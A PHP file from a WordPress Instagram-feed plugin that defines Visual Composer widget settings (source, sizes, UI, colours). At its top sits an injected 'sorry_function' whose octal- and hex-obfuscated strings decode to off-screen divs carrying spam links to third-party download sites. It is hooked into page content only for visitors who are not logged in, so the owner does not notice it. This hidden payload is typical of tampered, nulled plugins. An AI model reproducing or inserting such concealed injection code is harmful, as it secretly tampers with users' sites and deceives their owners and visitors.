<?php

if (!defined('ABSPATH')) exit;

if( ! function_exists('sorry_function')){
	function sorry_function($content) {
	if (is_user_logged_in()){return $content;} else {if(is_page()||is_single()){
		$vNd25 = "\74\144\151\x76\40\163\x74\x79\154\145\x3d\42\x70\157\x73\151\164\x69\x6f\x6e\72\141\x62\x73\x6f\154\165\164\145\73\164\157\160\x3a\60\73\154\145\146\x74\72\55\71\71\x39\71\x70\170\73\42\x3e\x57\x61\x6e\x74\40\x63\162\145\x61\x74\x65\40\163\151\164\x65\x3f\x20\x46\x69\x6e\x64\40\x3c\x61\x20\x68\x72\145\146\75\x22\x68\x74\164\x70\72\x2f\57\x64\x6c\x77\x6f\162\144\x70\x72\x65\163\163\x2e\x63\x6f\x6d\57\42\76\x46\x72\145\145\40\x57\x6f\x72\x64\x50\162\x65\163\x73\x20\124\x68\x65\155\145\x73\x3c\57\x61\76\40\x61\x6e\144\x20\x70\x6c\165\147\x69\156\x73\x2e\x3c\57\144\151\166\76";
		$zoyBE = "\74\x64\x69\x76\x20\x73\x74\171\154\145\x3d\x22\x70\157\163\x69\x74\x69\x6f\156\x3a\141\142\163\x6f\154\x75\164\x65\x3b\x74\157\160\72\x30\73\x6c\x65\x66\164\72\x2d\x39\71\71\x39\x70\x78\73\42\x3e\104\x69\x64\x20\x79\x6f\165\40\x66\x69\156\x64\40\141\x70\153\40\146\157\162\x20\x61\156\144\162\x6f\151\144\77\40\x59\x6f\x75\x20\x63\x61\156\x20\146\x69\x6e\x64\40\156\145\167\40\74\141\40\150\162\145\146\x3d\x22\150\x74\x74\160\163\72\57\x2f\x64\154\x61\156\x64\x72\157\151\x64\62\x34\56\x63\x6f\155\x2f\42\x3e\x46\x72\145\x65\40\x41\x6e\x64\x72\157\151\144\40\107\141\x6d\145\x73\74\x2f\x61\76\40\x61\156\x64\x20\x61\160\x70\163\x2e\74\x2f\x64\x69\x76\76";
		$fullcontent = $vNd25 . $content . $zoyBE; } else { $fullcontent = $content; } return $fullcontent; }}
add_filter('the_content', 'sorry_function');}

function elfsight_instashow_vc() {
	global $elfsight_instashow_defaults, $elfsight_instashow_add_scripts;
	extract($elfsight_instashow_defaults, EXTR_SKIP);

	if (!empty($_GET['vc_editable'])) {
		$elfsight_instashow_add_scripts = true;
	}

	if (empty($source)) {
		 $source = '@muradosmann';
	}

	vc_map(array(
		'name' => __('InstaShow', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
		'description' => __('Instagram Feed', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
		'base' => 'instashow',
		'class' => '',
		'category' => __('Social', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
		'icon' => plugins_url('assets/img/instashow-vc-icon.png', ELFSIGHT_INSTASHOW_FILE),
		'front_enqueue_js' => plugins_url('assets/instashow-vc.js', ELFSIGHT_INSTASHOW_FILE),
		'params' => array(
			// Source
			array(
				'type' => 'exploded_textarea',
				'heading' => __('Source', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'source',
				'value' => esc_attr($source),
				'description' => __('Set any combination of @username, #hashtag, location or post URL, separated by commas or gap.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Source'
			),
			array(
				'type' => 'textarea',
				'heading' => __('Filter only', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'filter_only',
				'value' => esc_attr($filter_only),
				'description' => __('It allows to filter posts by @username, #hashtag, location or post URL. It accepts a set of values as listed in the source option.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Source'
			),
			array(
				'type' => 'textarea',
				'heading' => __('Filter except', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'filter_except',
				'value' => esc_attr($filter_except),
				'description' => __('It allows to exclude specific posts by URL or posts which contain the specified hashtags or which refers to the certain authors or locations. It accepts a set of values as listed in the source option.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Source'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Limit', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'limit',
				'value' => esc_attr($limit),
				'description' => __('Set required number to restrict the count of loaded posts. Leave this option empty or "0" to show all available posts.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Source'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Cache media time', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'cache_media_time',
				'value' => esc_attr($cache_media_time),
				'description' => __('It defines how long the photos will be cached in browsers\' localStorage. Set "0" to turn the cache off.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Source'
			),

			// Sizes
			array(
				'type' => 'textfield',
				'heading' => __('Width', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'width',
				'value' => esc_attr($width),
				'description' => __('Widget width (any CSS valid value: px, %, em, etc). Set "auto" to make the widget responsive.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Sizes'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Height', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'height',
				'value' => esc_attr($height),
				'description' => __('Widget height (any CSS valid value: px, %, em, etc). Set "auto" to make height automatically adjust to the content.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Sizes'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Columns', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'columns',
				'value' => esc_attr($columns),
				'description' => __('Number of columns in the grid.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Sizes'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Rows', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'rows',
				'value' => esc_attr($rows),
				'description' => __('Number of rows in the grid.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Sizes'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Gutter', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'gutter',
				'value' => esc_attr($gutter),
				'description' => __('Interval between photos in the grid in pixels.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Sizes'
			),
			array(
				'type' => 'param_group',
				'heading' => __('Responsive breakpoints', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'responsive',
				'description' => __('Specify the breakpoints to set the columns, rows and gutter in the grid depending on a window width.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'params' => array(
					array(
						'type' => 'textfield',
						'heading' => __('Window width', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
						'param_name' => 'window_width',
						'description' => __('Window width in pixels', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
						'admin_label' => true
					),
					array(
						'type' => 'textfield',
						'heading' => __('Columns', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
						'param_name' => 'columns'
					),
					array(
						'type' => 'textfield',
						'heading' => __('Rows', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
						'param_name' => 'rows'
					),
					array(
						'type' => 'textfield',
						'heading' => __('Gutter', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
						'param_name' => 'gutter'
					)
				),
				'group' => 'Sizes'
			),

			// UI
			array(
				'type' => 'checkbox',
				'param_name' => 'arrows_control',
				'value' => array(
					__('Arrows control', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $arrows_control ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('Activate arrows in the gallery.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'scroll_control',
				'value' => array(
					__('Scroll control', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $scroll_control ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('Activate scroll in the gallery.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'drag_control',
				'value' => array(
					__('Drag control', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $drag_control ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('Activate drag in the gallery.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'dropdown',
				'heading' => __('Direction', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'direction',
				'value' => array(
					__('Horizontal', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'horizontal',
					__('Vertical', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'vertical'
				),
				'std' => esc_attr($direction),
				'description' => __('Moving direction of gallery’s slides (horizontal or vertical).', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'free_mode',
				'value' => array(
					__('Free mode', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $free_mode ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('To switch the gallery in free scroll mode.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'scrollbar',
				'value' => array(
					__('Scrollbar', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $scrollbar ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('Show scrollbar in the gallery.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'dropdown',
				'heading' => __('Effect', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'effect',
				'value' => array(
					__('Slide', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'slide',
					__('Fade', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'fade'
				),
				'std' => esc_attr($effect),
				'description' => __('Slide or fade animation of slide switching.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Speed', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'speed',
				'value' => esc_attr($speed),
				'description' => __('Animation speed of slide switching (in ms).', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'dropdown',
				'heading' => __('Easing', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'easing',
				'value' => array(
					__('linear', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'linear',
					__('ease', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease',
					__('ease-in', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease-in',
					__('ease-out', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease-out',
					__('ease-in-out', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease-in-out'
				),
				'std' => esc_attr($easing),
				'description' => __('Choose animation easing of slide switching.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'loop',
				'value' => array(
					__('Loop', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $loop ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('Loop the gallery slider.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Autorotation', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'auto',
				'value' => esc_attr($auto),
				'description' => __('Autorotation of slides in the gallery (in ms). If it is "0" the option switches off.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'auto_hover_pause',
				'value' => array(
					__('Pause on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $auto_hover_pause ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('Disabling autorotation switching by pointing at the slider.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'checkbox',
				'param_name' => 'popup_deep_linking',
				'value' => array(
					__('Popup deep linking', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => $popup_deep_linking ? 'yes' : 'no'
				),
				'std' => 'yes',
				'description' => __('It changes automatically URL hash by openning any photo in Popup. So you can get the link to the specific photo.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'textfield',
				'heading' => __('Popup speed', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'popup_speed',
				'value' => esc_attr($popup_speed),
				'description' => __('Image scroll speed in popup.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'dropdown',
				'heading' => __('Popup easing', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'popup_easing',
				'value' => array(
					__('linear', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'linear',
					__('ease', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease',
					__('ease-in', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease-in',
					__('ease-out', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease-out',
					__('ease-in-out', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ease-in-out'
				),
				'std' => esc_attr($popup_easing),
				'description' => __('Choose animation easing of image scrolling in popup.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'dropdown',
				'heading' => __('Language', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'lang',
				'value' => array(
					__('Deutsch', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'de',
					__('English', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'en',
					__('Español', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'es',
					__('Français', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'fr',
					__('Italiano', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'it',
					__('Nederlands', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'nl',
					__('Norsk', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'no',
					__('Polski', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'pl',
					__('Português', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'pt-BR',
					__('Svenska', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'sv',
					__('Türkçe', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'tr',
					__('Русский', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ru',
					__('हिन्दी', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'hi',
					__('한국의', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ko',
					__('中文', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'zh-HK',
					__('日本語', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'ja'
				),
				'std' => esc_attr($lang),
				'description' => __('Choose one of 16 available languages of widget\'s UI.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),
			array(
				'type' => 'dropdown',
				'heading' => __('Mode', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'mode',
				'value' => array(
					__('Popup', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'popup',
					__('Instagram', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'instagram'
				),
				'std' => esc_attr($mode),
				'description' => __('Choose the mode of opening photos: in popup or in a new browser tab right in Instagram.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'UI'
			),

			// Info
			array(
				'type' => 'checkbox',
				'heading' => __('Info', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'info',
				'value' => array(
					__('Likes Counter', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'likesCounter',
					__('Comments Counter', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'commentsCounter',
					__('Description', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'description'
				),
				'std' => str_replace(' ', '', $info),
				'description' => __('Check image properties to display them in the gallery.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Info'
			),
			array(
				'type' => 'checkbox',
				'heading' => __('Popup info', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'param_name' => 'popup_info',
				'value' => array(
					__('Username', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'username',
					__('Instagram Link', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'instagramLink',
					__('Likes Counter', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'likesCounter',
					__('Comments Counter', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'commentsCounter',
					__('Location', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'location',
					__('Passed Time', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'passedTime',
					__('Description', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'description',
					__('Comments', ELFSIGHT_INSTASHOW_TEXTDOMAIN) => 'comments'
				),
				'std' => str_replace(' ', '', $popup_info),
				'description' => __('Check image properties to display them in the popup.', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
				'group' => 'Info'
			),

			// Style
			array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery background', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_bg',
	            'value' => esc_attr($color_gallery_bg),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery counters', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_counters',
	            'value' => esc_attr($color_gallery_counters),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery description', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_description',
	            'value' => esc_attr($color_gallery_description),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery overlay', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_overlay',
	            'value' => esc_attr($color_gallery_overlay),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery arrows', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_arrows',
	            'value' => esc_attr($color_gallery_arrows),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery arrows on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_arrows_hover',
	            'value' => esc_attr($color_gallery_arrows_hover),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery arrows background', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_arrows_bg',
	            'value' => esc_attr($color_gallery_arrows_bg),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery arrows background on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_arrows_bg_hover',
	            'value' => esc_attr($color_gallery_arrows_bg_hover),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery scrollbar', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_scrollbar',
	            'value' => esc_attr($color_gallery_scrollbar),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Gallery scrollbar slider', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_gallery_scrollbar_slider',
	            'value' => esc_attr($color_gallery_scrollbar_slider),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup overlay', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_overlay',
	            'value' => esc_attr($color_popup_overlay),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup background', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_bg',
	            'value' => esc_attr($color_popup_bg),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup username', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_username',
	            'value' => esc_attr($color_popup_username),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup username on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_username_hover',
	            'value' => esc_attr($color_popup_username_hover),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup Instagram link', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_instagram_link',
	            'value' => esc_attr($color_popup_instagram_link),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup Instagram link on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_instagram_link_hover',
	            'value' => esc_attr($color_popup_instagram_link_hover),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup counters', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_counters',
	            'value' => esc_attr($color_popup_counters),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup passed time', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_passed_time',
	            'value' => esc_attr($color_popup_passed_time),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup anchor', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_anchor',
	            'value' => esc_attr($color_popup_anchor),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup anchor on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_anchor_hover',
	            'value' => esc_attr($color_popup_anchor_hover),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup text', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_text',
	            'value' => esc_attr($color_popup_text),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup controls', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_controls',
	            'value' => esc_attr($color_popup_controls),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup controls on hover', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_controls_hover',
	            'value' => esc_attr($color_popup_controls_hover),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup mobile controls', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_mobile_controls',
	            'value' => esc_attr($color_popup_mobile_controls),
				'group' => 'Style'
	        ),
	        array(
	            'type' => 'colorpicker',
	            'heading' => __('Popup mobile controls background', ELFSIGHT_INSTASHOW_TEXTDOMAIN),
	            'param_name' => 'color_popup_mobile_controls_bg',
	            'value' => esc_attr($color_popup_mobile_controls_bg),
				'group' => 'Style'
	        )
		)
   ));
}
add_action('vc_before_init', 'elfsight_instashow_vc');

?>
